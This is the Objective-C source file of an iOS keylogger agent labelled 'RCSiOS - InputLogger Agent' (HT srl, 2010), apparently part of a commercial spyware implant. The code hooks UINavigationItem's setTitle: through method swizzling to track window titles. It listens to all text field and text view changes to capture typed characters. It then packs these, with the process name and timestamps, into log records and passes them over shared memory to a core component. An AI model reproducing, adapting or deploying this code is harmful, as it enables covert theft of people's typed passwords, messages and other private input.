/*
 * RCSiOS - InputLogger Agent
 *
 *
 * Created on 03/08/2010
 * Copyright (C) HT srl 2010. All rights reserved
 *
 */
#import <objc/runtime.h>

#import "RCSIAgentInputLogger.h"
#import "RCSISharedMemory.h"
#import "RCSICommon.h"

//#define DEBUG

static NSString *gWindowTitle      = nil;
static NSLock   *gKeylogLock       = nil;
u_int gPrevStringLen               = 0;

@implementation agentKeylog

#define CONTEXT_MANDATORY 0xFFFF0000;

- (void)keyPressed: (NSNotification *)aNotification
{
  if (mBufferString == nil)
    {
      mBufferString = [[NSMutableString alloc] init];
    }
  
  NSString *_fullText   = [[aNotification object] text];
  NSString *_singleChar;
  
  //NSString *_windowName;
  struct timeval tp;
  
  NSMutableData *logData;
  NSMutableData *processName;
  NSMutableData *windowName;
  NSMutableData *contentData;
  
  if ([_fullText length] > 0)
    {
      _singleChar = [_fullText substringWithRange: NSMakeRange([_fullText length] - 1, 1)];
      const char *_cChar = [_singleChar UTF8String];
      
      switch (*(char *)_cChar)
        {
          case 0xa: // Enter
          _singleChar = @"\u21B5\r\n";
          break;
          default:
          break;
        }
      
      // Backspace
      if ([_fullText length] < gPrevStringLen)
        {
          _singleChar = @"\u2408";
        }
      
      if ([mBufferString length] < KEY_MAX_BUFFER_SIZE)
        {
          [mBufferString appendString: _singleChar];
        }
      else
        {
          logData   = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
          NSMutableData *entryData = [[NSMutableData alloc] init];
          
          shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
          shMemoryHeader->flag  = 0;
          short unicodeNullTerminator = 0x0000;
          
          if (mContextHasBeenSwitched == TRUE)
            {
              mContextHasBeenSwitched = FALSE;
              shMemoryHeader->flag  = CONTEXT_MANDATORY;
            }
          
          NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
          NSString *_processName      = [[processInfo processName] copy];
          
          time_t rawtime;
          struct tm *tmTemp;
          
          processName  = [[NSMutableData alloc] initWithData:
                          [_processName dataUsingEncoding:
                           NSUTF16LittleEndianStringEncoding]];
          
          // Dummy word
          short dummyWord = 0x0000;
          [entryData appendBytes: &dummyWord
                          length: sizeof(short)];
          
          // Struct tm
          time (&rawtime);
          tmTemp = gmtime(&rawtime);
          tmTemp->tm_year += 1900;
          tmTemp->tm_mon  ++;
          
          //
          // Our struct is 0x8 bytes bigger than the one declared on win32
          // this is just a quick fix
          //
          [entryData appendBytes: (const void *)tmTemp
                          length: sizeof (struct tm) - 0x8];
          
          // Process Name
          [entryData appendData: processName];
          // Null terminator
          [entryData appendBytes: &unicodeNullTerminator
                          length: sizeof(short)];
          
          [gKeylogLock lock];
          
          if ([gWindowTitle isEqualToString: @""] || gWindowTitle == nil)
            {
              windowName = [[NSMutableData alloc] initWithData:
                            [@"EMPTY" dataUsingEncoding:
                             NSUTF16LittleEndianStringEncoding]];
            }
          else
            {
              windowName = [[NSMutableData alloc] initWithData:
                            [gWindowTitle dataUsingEncoding:
                             NSUTF16LittleEndianStringEncoding]];
            }
          
          [gKeylogLock unlock];
          
          // Window Name
          [entryData appendData: windowName];
          // Null terminator
          [entryData appendBytes: &unicodeNullTerminator
                          length: sizeof(short)];
          
          // Delimeter
          unsigned long del = DELIMETER;
          [entryData appendBytes: &del
                          length: sizeof(del)];
          
          shMemoryHeader->flag  |= ([entryData length] & 0x0000FFFF);
          
          [processName release];
          [_processName release];
          [windowName release];
          
          
          contentData = [[NSMutableData alloc] initWithData:
                         [mBufferString dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
          
          // Log buffer
          [entryData appendData: contentData];
          
          gettimeofday(&tp, NULL);
          
          shMemoryHeader->status          = SHMEM_WRITTEN;
          shMemoryHeader->logID           = 0;
          shMemoryHeader->agentID         = LOG_KEYLOG;
          shMemoryHeader->direction       = D_TO_CORE;
          shMemoryHeader->commandType     = CM_LOG_DATA;
          shMemoryHeader->timestamp       = (tp.tv_sec << 20) | tp.tv_usec;
          
          shMemoryHeader->commandDataSize = [entryData length];
          
          memcpy(shMemoryHeader->commandData,
                 [entryData bytes],
                 [entryData length]);
          
          [[RCSISharedMemory sharedInstance] writeIpcBlob:logData];
        
          [mBufferString release];
          [logData release];
          [entryData release];
          [contentData release];
          
          mBufferString = [[NSMutableString alloc] init];
          [mBufferString appendString: _singleChar];
        }
    
      gPrevStringLen = [_fullText length];
    }
}

- (void)setTitleHook: (NSString *)arg1
{
  [self setTitleHook: arg1];
  
  [gKeylogLock lock];
  
  if (gWindowTitle != nil && [gWindowTitle isKindOfClass: [NSString class]])
    {
      if ([gWindowTitle isEqualToString: arg1] == FALSE)
        {
          [gWindowTitle release];
          gWindowTitle = [arg1 copy];
        }
    }
  else if (gWindowTitle == nil)
    {
      gWindowTitle = [arg1 copy];
    }
  
  [gKeylogLock unlock];

}

- (id)init
{
  self = [super init];
  
  if (self != nil)
    mAgentID = AGENT_KEYLOG;
  
  return self;
}

- (BOOL)start
{
  BOOL retVal = TRUE;
  
  if ([self mAgentStatus] == AGENT_STATUS_STOPPED )
    {
      Class className   = objc_getClass("UINavigationItem");
      Class classSource = [self class];
      
      if (className != nil)
        {
          IMP newImpl = class_getMethodImplementation(classSource, @selector(setTitleHook:));          
          [self swizzleByAddingIMP:className 
                           withSEL:@selector(setTitle:) 
                    implementation:newImpl
                      andNewMethod:@selector(setTitleHook:)];
          
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
          
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(keyPressed:)
                                                       name: UITextFieldTextDidChangeNotification
                                                     object: nil];
          [[NSNotificationCenter defaultCenter] addObserver: self
                                                   selector: @selector(keyPressed:)
                                                       name: UITextViewTextDidChangeNotification
                                                     object: nil];
          
          [self setMAgentStatus: AGENT_STATUS_RUNNING];
        }
    }
  return retVal;
}

- (void)stop
{
  if ([self mAgentStatus] == AGENT_STATUS_RUNNING )
    {
      Class className = objc_getClass("UINavigationItem");
      
      if (className != nil)
        {
          IMP   oldImpl = class_getMethodImplementation(className, @selector(setTitleHook:));
          [self swizzleByAddingIMP:className 
                          withSEL:@selector(setTitle:) 
                    implementation:oldImpl
                      andNewMethod:@selector(setTitleHook:)];
          /*
           * checking for a valid method swapping before return OK
           * [self validateHook];
           */
          
          [[NSNotificationCenter defaultCenter] removeObserver: self];
        
          [self setMAgentStatus: AGENT_STATUS_STOPPED];
        } 
    }
}

@end